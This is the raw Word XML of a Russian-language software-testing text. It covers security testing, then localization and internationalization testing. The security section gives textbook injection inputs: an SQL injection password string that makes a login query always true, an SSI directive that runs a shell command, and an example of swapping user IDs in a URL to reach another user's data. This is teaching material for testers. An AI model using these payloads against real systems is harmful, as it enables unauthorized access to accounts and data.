          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>т</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>д</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>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Вставки исполняемого кода рассмотрим на примере кода SQL.</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t>Форма входа в систему имеет 2 поля - имя и пароль. Обработка происходит в базе данных через выполнение SQL запроса:</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SELECT Username</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FROM Users</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WHERE Name = 'tester'</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lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">AND </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Password</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> = '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>testpass</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Вводим корректное имя ’</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>tester</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>’, а в поле пароль вводим строку:</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ab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>testpass</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>' OR '1'='1</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В итоге, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Если</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> поле не имеет соответствующих </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>валидаций</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> или обработчиков данных, может вскрыться уязвимость, позволяющая зайти в защищенную паролем систему, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>т.к.SQL</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> запрос примет следующий вид:</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rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SELECT Username</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FROM Users</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WHERE Name = 'tester'</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lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>AND Password = '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>testpass</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>' OR '1'='1';</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Условие '1'='1' всегда будет истинным и поэтому SQL запрос всегда будет возвращать много значений.</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roofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Server-Side</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Includes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SSI) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Injection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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 xml:space="preserve">В зависимости от типа операционной системы команды могут быть разными, как пример рассмотрим команду, которая выводит на экран список файлов в OS </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Linux</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roofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>&lt; !</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>--#</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>exec</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cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>" --&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="005E2C4B"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proofErr w:type="spellStart"/>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Authorization</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Bypass</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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lastRenderedPageBreak/>
        <w:t xml:space="preserve">Пользователь А может получить доступ к документам пользователя Б. Допустим, есть реализация, где при просмотре своего профиля, содержащего </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>конфеденциальную</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> информацию, в URL страницы передается </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>userID</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">, а данном случае есть смысл попробовать подставить вместо своего </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>userID</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> номер другого пользователя. И если вы увидите его данные, значит вы нашли дефект.</w:t>
      </w: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p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="708"/>
          <w:tab w:val="left" w:pos="2325"/>
        </w:tabs>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Тестирование локализации (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>localization</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>testing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>)</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Тестирование локализации - это процесс тестирования локализованной версии программного продукта. Тестирование локализации позволяет проверить насколько хорошо адаптирован продукт для определенной целевой аудитории в соответствии с ее культурными особенностями. Как правило, здесь рассматривается культурный и языковой аспекты, в частности перевод пользовательского интерфейса и соответствующей документации и файлов на другой язык, а также форматы валют, чисел, времени и телефонных номеров, и др.</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Наши высококвалифицированные специалисты занимаются локализацией русской, английской, немецкой, французской и итальянской и других версий продуктов.</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В нашей команде работают профессиональные лингвисты и QA инженеры, которые совместно работают над выявлением ошибок локализации.</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В тестирование локализации входит проверка правильности переведенного контента, различных элементов интерфейса, ошибок и системных сообщений, проверка раздела FAQ/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Help</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> и вспомогательной документации.</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Цель проводимого тестирования — проверить </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>мультиязычный</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> интерфейс приложения или сайта на наличие ошибок перевода, правильности почтовых адресов, имени и фамилии, валют, формата даты и времени, и пр.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="360"/>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Как правило, мы не тестируем на наличие орфографических и грамматических ошибок. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Чеклист</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> тестирования локализации включает в себя:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>
        </w:num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lastRenderedPageBreak/>
        <w:t>Определение того, какие языки поддерживаются приложением;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
        </w:num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Проверка правильности перевода в соответствии с тематикой приложения;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="26"/>
        </w:num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Проверка правильности перевода элементов интерфейса приложения;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>
        </w:num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Проверка перевода раздела FAQ/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Help</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t xml:space="preserve"> и вспомогательной документации.</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Тестирование интернационализации представляет собой проектирование и создание продукта и документации, используя техники, упрощающие локализацию приложения. Сюда входят:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:num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создание продукта с учетом стандарта кодирования </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>Unicode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        </w:rPr>
        <w:t>, который поддерживает практически все языки мира;</w:t>
      </w:r>
    </w:p>
